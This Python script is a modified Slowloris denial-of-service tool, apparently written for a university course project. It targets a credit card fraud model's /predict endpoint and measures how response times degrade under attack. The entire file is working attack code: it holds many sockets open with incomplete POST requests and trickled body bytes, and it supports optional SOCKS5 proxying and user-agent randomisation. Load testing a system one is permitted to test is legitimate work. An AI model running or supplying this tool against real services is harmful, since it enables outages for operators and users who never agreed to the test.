#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import requests
import threading
import csv
import datetime

# This is a modification of the slowloris attack found at https://github.com/gkbrk/slowloris
# This version was modified to test the Credit Card Fraud model for the SOEN 321 Final Project

parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)


# Function to log CSV data
def log_to_csv(filename, data):
    with open(filename, 'a', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(data)

# Create file handler for logging to 'slowloris_log.txt'
file_handler = logging.FileHandler('slowloris_log.txt')
file_handler.setFormatter(logging.Formatter(
    "[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S"
))

# Create console handler for printing logs to the console
console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter(
    "[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S"
))

# Get the root logger
logger = logging.getLogger()

# Set the log level based on the --verbose flag
logger.setLevel(logging.DEBUG if args.verbose else logging.INFO)

# Attach both handlers to the root logger
logger.addHandler(file_handler)
logger.addHandler(console_handler)

def send_valid_request(url):
    payload = {
        "distance_from_home": random.uniform(0, 100),
        "distance_from_last_transaction": random.uniform(0, 50),
        "ratio_to_median_purchase_price": random.uniform(0.1, 10),
        "repeat_retailer": random.randint(0, 1),
        "used_chip": random.randint(0, 1),
        "used_pin_number": random.randint(0, 1),
        "online_order": random.randint(0, 1)
    }
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        start = time.time()
        response = requests.post(url, json=payload, timeout=10)
        response_time = time.time() - start
        
        if response.status_code == 200:
            processing_time = response.json().get('processing_time', -1)
            log_to_csv('attacker_metrics.csv', [current_time, response_time, processing_time])
            return response_time, processing_time
        else:
            logging.error(f"Error in request: {response.status_code} - {response.text}")
            log_to_csv('attacker_metrics.csv', [current_time, -1, -1])
            return -1, -1
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        log_to_csv('attacker_metrics.csv', [current_time, -1, -1])
        return -1, -1

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


if args.https:
    logging.info("Importing ssl module")
    import ssl

    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)


def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip, args.port))

    s.send_line("POST /predict HTTP/1.1")
    s.send_header("Host", args.host)

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Content-Type", "application/json")
    s.send_header("Content-Length", "10000")
    s.send_line("")
    return s


def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send(b"a" * 150) # Sends one * x byte of body
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

def initial_phase(url):
    response_times = []
    processing_times = []

    for _ in range(30):
        resp_time, proc_time = send_valid_request(url)
        if resp_time is not None:
            response_times.append(resp_time)
        if proc_time is not None:
            processing_times.append(proc_time)
        time.sleep(1)
    avg_response_time = -1
    avg_processing_time = -1
    if response_times:
        avg_response_time = sum(response_times) / len(response_times)
        logging.info(f"Pre-attack phase average response time: {avg_response_time:.4f} seconds")
    if processing_times:
        avg_processing_time = sum(processing_times) / len(processing_times)
        logging.info(f"Pre-attack phase average processing time: {avg_processing_time:.4f} seconds")
    return avg_response_time, avg_processing_time

def send_requests_during_attack(url, duration, num_requests, result_container):
    interval = duration / num_requests
    response_times = []
    processing_times = []
    logging.info("Starting valid requests during attack phase")
    start_time = time.time()
    for i in range(num_requests):
        # Intended time for this request
        intended_send_time = start_time + i * interval
        # Sleep until that time if we haven't reached it yet
        sleep_time = intended_send_time - time.time()
        if sleep_time > 0:
            time.sleep(sleep_time)
        # Send the request
        resp_time, proc_time = send_valid_request(url)
        if resp_time is not None:
            response_times.append(resp_time)
        if proc_time is not None:
            processing_times.append(proc_time)
    result_container['response_times'] = response_times
    result_container['processing_times'] = processing_times

with open('attacker_metrics.csv', 'w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow(['date', 'response_time', 'processing_time'])

def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    url = f"http://{ip}:{args.port}/predict"

    # PRE ATTACK PHASE
    initial_avg_response_time, initial_avg_processing_time = initial_phase(url)

    # SOCKET CREATION PHASE
    logging.info("Creating sockets...")
    socket_start_time = time.time()
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)
    socket_end_time = time.time()
    socket_phase_duration = socket_end_time - socket_start_time
    logging.info(f"Socket creation time: {socket_phase_duration:.2f} seconds")

    # CORE ATTACK PHASE
    attack_duration = 300
    num_valid_requests = 60
    result_container = {}

    request_thread = threading.Thread(
        target=send_requests_during_attack,
        args=(url, attack_duration, num_valid_requests, result_container)
    )
    request_thread.start()

    logging.info("Starting 5-minute attack phase")
    attack_start_time = time.time()
    while time.time() - attack_start_time < attack_duration:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)

    request_thread.join()

    response_times = result_container.get('response_times', [])
    processing_times = result_container.get('processing_times', [])
    
    attack_avg_response_time = -1
    attack_avg_processing_time = -1
    if response_times:
        attack_avg_response_time = sum(response_times) / len(response_times)
        logging.info(f"Attack average response time: {attack_avg_response_time:.4f} seconds")
    if processing_times:
        attack_avg_processing_time = sum(processing_times) / len(processing_times)
        logging.info(f"Attack average processing time: {attack_avg_processing_time:.4f} seconds")

    total_attack_time = time.time() - attack_start_time
    logging.info(f"Total attack phase runtime: {total_attack_time:.2f} seconds")
    logging.info("===============================================================")
    logging.info(f"SUMMARY OF ALL AVERAGE TIMES:")
    logging.info(f"Pre-attack average response time: {initial_avg_response_time:.4f} seconds")
    logging.info(f"Pre-attack average processing time: {initial_avg_processing_time:.4f} seconds")
    logging.info(f"During attack average response time: {attack_avg_response_time:.4f} seconds")
    logging.info(f"During attack average processing time: {attack_avg_processing_time:.4f} seconds")

if __name__ == "__main__":
    main()
